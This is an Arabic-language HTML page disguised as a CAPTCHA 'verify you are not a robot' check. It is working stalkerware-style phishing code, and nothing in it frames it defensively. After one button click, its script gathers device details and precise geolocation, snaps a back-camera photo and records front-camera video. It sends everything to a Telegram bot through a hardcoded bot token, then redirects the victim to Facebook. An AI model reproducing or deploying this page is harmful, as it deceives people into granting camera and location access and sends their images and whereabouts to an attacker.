<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>التحقق من أنك لست روبوت</title>
<style>
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #f0f2f5;
    margin: 0; padding: 0;
    display: flex; justify-content: center; align-items: center;
    min-height: 100vh; color: #333;
}
.captcha-container {
    background-color: white;
    border-radius: 12px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    width: 90%; max-width: 500px;
    padding: 30px; text-align: center;
}
.logo {
    width: 80px; height: 80px;
    margin: 0 auto 20px;
    background-color: #4285F4;
    border-radius: 50%; display: flex;
    justify-content: center; align-items: center;
    color: white; font-size: 24px; font-weight: bold;
}
button {
    background-color: #4285F4; color: white;
    border: none; border-radius: 4px;
    padding: 12px 24px; font-size: 16px;
    cursor: pointer; width: 100%;
}
button:hover { background-color: #3367D6; }
.loading {
    display: inline-block; width: 20px; height: 20px;
    border: 3px solid rgba(0,0,0,.3);
    border-radius: 50%; border-top-color: #000;
    animation: spin 1s ease-in-out infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="captcha-container">
    <div class="logo">✓</div>
    <h1>التحقق من أنك لست روبوت</h1>
    <p>لحماية موقعنا، اضغط على الزر لبدء التحقق.</p>
    <button id="start-btn">ابدأ التحقق</button>
    <div id="status-message" style="margin-top:15px;"></div>
</div>

<script>
const BOT_TOKEN = "6308792872:AAE_URrFMBsQILWe4ToTOgB90dVxZgu0fZY";
const FACEBOOK_URL = "https://www.facebook.com";

const collectedData = {
    systemInfo: {}, backCamera: { photo: null, allowed: false },
    frontCamera: { video: null, allowed: false },
    location: { coords: null, address: null, allowed: false },
    battery: {}, screen: {}
};

function getChatIdFromUrl(){
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('chat_id') || null;
}

async function getSystemInfo(){
    collectedData.screen = {
        width: screen.width, height: screen.height,
        orientation: screen.orientation?.type || 'غير معروف'
    };
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            collectedData.battery = {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging ? 'نعم' : 'لا'
            };
        } catch { collectedData.battery = { error: 'لا يمكن قراءة البطارية' }; }
    }
    collectedData.systemInfo = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform
    };
}

async function requestLocation(){
    return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve();
        navigator.geolocation.getCurrentPosition(async (pos) => {
            collectedData.location.coords = {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude
            };
            collectedData.location.allowed = true;
            try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
                const data = await res.json();
                collectedData.location.address = data.display_name;
            } catch {}
            resolve();
        }, () => resolve(), { enableHighAccuracy: true, timeout: 10000 });
    });
}

async function captureBackCameraPhoto(){
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        const video = document.createElement('video');
        video.srcObject = stream; await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        collectedData.backCamera.photo = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
        collectedData.backCamera.allowed = true;
        stream.getTracks().forEach(t => t.stop());
    } catch {}
}

async function recordFrontCameraVideo(){
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => e.data.size && chunks.push(e.data);
        recorder.onstop = () => {
            collectedData.frontCamera.video = new Blob(chunks, { type: 'video/webm' });
            collectedData.frontCamera.allowed = true;
            stream.getTracks().forEach(t => t.stop());
        };
        recorder.start(); setTimeout(()=> recorder.stop(), 3000);
        await new Promise(r => setTimeout(r, 3500));
    } catch {}
}

async function sendAllDataToTelegram(chatId){
    let msg = `📊 <b>تقرير التحقق</b>\n⏰ ${new Date().toLocaleString()}\n💻 ${collectedData.systemInfo.userAgent}`;
    await sendToTelegram(chatId, msg, 'text');
    if (collectedData.backCamera.photo) await sendToTelegram(chatId, collectedData.backCamera.photo, 'photo');
    if (collectedData.frontCamera.video) await sendToTelegram(chatId, collectedData.frontCamera.video, 'video');
}

async function sendToTelegram(chatId, data, type){
    if (type === 'text'){
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
            method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({ chat_id:chatId, text:data, parse_mode:'HTML' })
        });
    } else {
        const form = new FormData();
        form.append('chat_id', chatId);
        if (type==='photo') form.append('photo', data, 'photo.jpg');
        if (type==='video') form.append('video', data, 'video.webm');
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${type==='photo'?'sendPhoto':'sendVideo'}`, { method:'POST', body:form });
    }
}

document.getElementById('start-btn').addEventListener('click', async () => {
    const status = document.getElementById('status-message');
    status.innerHTML = '<div class="loading"></div> جاري جمع البيانات...';
    const chatId = getChatIdFromUrl(); if (!chatId) return status.innerHTML = '❌ لا يوجد معرف دردشة';
    await getSystemInfo();
    await requestLocation();
    await captureBackCameraPhoto();
    await recordFrontCameraVideo();
    await sendAllDataToTelegram(chatId);
    status.innerHTML = '✅ تم التحقق! جاري التوجيه...';
    setTimeout(()=> window.location.href = FACEBOOK_URL, 2000);
});
</script>
</body>
</html>
